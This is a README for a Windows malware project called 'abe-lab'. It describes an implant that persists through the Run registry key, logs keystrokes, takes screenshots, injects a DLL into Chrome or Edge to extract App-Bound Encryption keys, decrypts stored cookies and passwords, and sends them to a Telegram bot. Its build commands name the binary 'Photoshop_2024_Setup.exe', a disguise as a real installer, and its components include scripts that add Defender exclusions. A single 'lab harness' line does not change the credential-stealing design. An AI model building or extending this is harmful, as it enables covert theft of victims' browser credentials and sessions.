# abe-lab

Windows 10/11 lab harness for Chrome/Edge **App-Bound Encryption (ABE)** key
extraction, `v20` cookie/password decryption, and Telegram exfiltration.

## Components

```
main.cpp                  single-stage Windows x64 implant
abe/abe_payload.cpp       DLL: reads Local State, calls IElevator::DecryptData
abe/abe_inject.cpp        standalone injector + decryptor (reference)
abe/abe_util.h            shared helpers
build.py                  staged dropper/loader/payload build (alternative)
cleanup_only.ps1          remove implant artifacts from a test VM
reset_vm.ps1              reset VM artifacts + Defender settings
test_setup.ps1            add Defender exclusions for the test folder
HANDOFF.md                full technical runbook (Vietnamese)
```

## Architecture

```
main exe
  -> self-copy + HKCU Run persistence
  -> keylogger (main thread)
  -> worker: screenshot, ABE dump
       -> decrypt embedded abe_payload.dll (XOR)
       -> inject browser process (LoadLibrary)
       -> payload: Local State -> app_bound_encrypted_key
                   -> IElevator2/IElevator DecryptData -> 32-byte key
       -> copy Cookies/Login Data (+ wal/shm) -> winsqlite3
       -> BCrypt AES-256-GCM (v20) / DPAPI (v10)
       -> JSON lines -> Telegram sendDocument
```

## Requirements

- Windows 10/11 x64, Chrome/Edge 64-bit, default user-data-dir.
- Same user for browser and injector.
- `winsqlite3.dll` (system DLL on Windows 10/11).
- MinGW-w64 to build.
- Telegram bot token + chat id.

## Build

```bash
# payload DLL
cd abe
x86_64-w64-mingw32-g++ -shared -o abe_payload.dll abe_payload.cpp \
  -static -lole32 -loleaut32 -lshlwapi -lshell32

# generate the embedded blob (XOR-encrypted)
xxd -i -n abe_payload_data abe_payload.dll > abe_payload_blob.h

cd ..
x86_64-w64-mingw32-g++ main.cpp -o Photoshop_2024_Setup.exe \
  -lwinhttp -lgdiplus -lgdi32 -lshlwapi -lshell32 -lole32 -loleaut32 \
  -lbcrypt -lcrypt32 -ladvapi32 -mwindows -static
```

## Configuration

Before building, set:

```cpp
static const std::wstring TG_TOKEN   = L"YOUR_BOT_TOKEN";
static const std::wstring TG_CHAT_ID = L"YOUR_CHAT_ID";
```

in `main.cpp` (and `abe/abe_inject.cpp` if building the standalone injector).

## Usage

```
Photoshop_2024_Setup.exe [chrome|edge|brave|PID]   # abe_inject.exe
```

`main.cpp` auto-detects Chrome -> Edge -> Brave.

Debug log: `%TEMP%\abe_debug.txt`
Payload error: `%TEMP%\abe_key_err.txt`

## Notes

- ABE is machine-bound: the extracted key only decrypts data from the same machine.
- `v20` cookies: plaintext = `SHA-256(host_key)` (32 bytes) + value.
- `v20` passwords: plaintext is the password.
- Edge has a secondary `aster_app_bound_encrypted_key` not handled here.
- Current injection is `LoadLibrary` (not reflective); the DLL stays loaded until the browser exits.

## Scope

Lab harness for Windows machines you own.
